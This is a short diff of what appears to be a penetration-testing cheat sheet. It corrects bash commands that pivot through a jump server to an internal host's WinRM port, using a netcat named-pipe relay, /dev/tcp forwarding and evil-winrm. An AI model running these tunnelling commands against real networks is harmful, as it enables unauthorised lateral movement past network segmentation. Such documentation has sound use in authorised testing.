@@ -30,14 +30,14 @@ _A **digital transformation** tailored to your organization is unique. It also c
 ```bash
 # On the jump server connect the port 3333 to the 5985
 mknod backpipe p;
-nc -lp 5985 0<backpipe | nc -lp 3333 1>backpipe
+nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe
 
 # On InternalA accessible from Jump and can access InternalB
 ## Expose port 3333 and connect it to the winrm port of InternalB
-exec3<>/dev/tcp/internalB/5985
-exec4<>/dev/tcp/Jump/3333
-cat<&3>&4&
-cat<&4>&3&
+exec 3<>/dev/tcp/internalB/5985
+exec 4<>/dev/tcp/Jump/3333
+cat <&3 >&4 &
+cat <&4 >&3 &
 
 # Fom the host, you can now access InternalB from the Jump server
 evil-winrm -u username -i Jump
